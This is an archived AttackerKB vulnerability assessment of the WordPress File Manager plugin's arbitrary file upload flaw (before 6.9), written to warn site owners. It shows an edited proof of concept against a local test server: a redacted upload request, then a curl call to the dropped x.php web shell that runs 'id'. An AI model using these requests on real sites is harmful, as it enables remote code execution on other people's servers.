---
title: WordPress File Manager Plugin < 6.9 Arbitrary File Upload
author: wvu-r7
score: 2
topic_attacker_value: 5
topic_exploitability: 5
created: '2020-09-04T19:42:56.066779'
revision_date: '2020-09-04T23:14:33.522871'
assessment_id: 95f73eb3-fbe8-4709-b11f-64e400312e9b
topic_id: 429d165b-c9c2-4d1a-93cd-ef9e3d9a3962
topic_short_id: NAQm8lynAg
topic_slug: wordpress-file-manager-plugin-6-9-arbitrary-file-upload
akb_topic_url: https://attackerkb.com/topics/NAQm8lynAg/wordpress-file-manager-plugin-6-9-arbitrary-file-upload
akb_assessment_url: https://attackerkb.com/topics/NAQm8lynAg/wordpress-file-manager-plugin-6-9-arbitrary-file-upload#95f73eb3-fbe8-4709-b11f-64e400312e9b
author_ratings:
  attacker-value: 5
  exploitability: 5
---

# WordPress File Manager Plugin < 6.9 Arbitrary File Upload

*Assessment by wvu-r7, archived from [AttackerKB](https://attackerkb.com/topics/NAQm8lynAg/wordpress-file-manager-plugin-6-9-arbitrary-file-upload#95f73eb3-fbe8-4709-b11f-64e400312e9b).*

---

WordPress sites are getting exploited en masse with this vuln. The File Manager plugin is the first result for "file manager" in the WordPress plugin database. No surprise lots of people are installing it, considering its generic name. ~700k by the numbers.

The vuln is trivial to exploit and weaponize, too. If you're running the plugin, you need to bring in incident response. The edited PoC below shows that the vuln can be exploited in two requests to execute arbitrary PHP code.

```
wvu@kharak:~$ curl -s http://127.0.0.1:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php [redacted] | jq
{
  "added": [
    {
      "isowner": false,
      "ts": 1599193366,
      "mime": "text/x-php",
      "read": 1,
      "write": 1,
      "size": "35",
      "hash": "l1_eC5waHA",
      "name": "x.php",
      "phash": "l1_Lw",
      "url": "/wp-content/plugins/wp-file-manager/lib/php/../files/x.php"
    }
  ],
  "removed": [],
  "changed": [
    {
      "isowner": false,
      "ts": 1599193366,
      "mime": "directory",
      "read": 1,
      "write": 1,
      "size": 0,
      "hash": "l1_Lw",
      "name": "files",
      "phash": "l1_L3Zhci93d3cvaHRtbC93cC1jb250ZW50L3BsdWdpbnMvd3AtZmlsZS1tYW5hZ2VyL2xpYg",
      "volumeid": "l1_",
      "locked": 1
    }
  ]
}
wvu@kharak:~$ curl http://127.0.0.1:8080/wp-content/plugins/wp-file-manager/lib/files/x.php -d c=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
wvu@kharak:~$
```
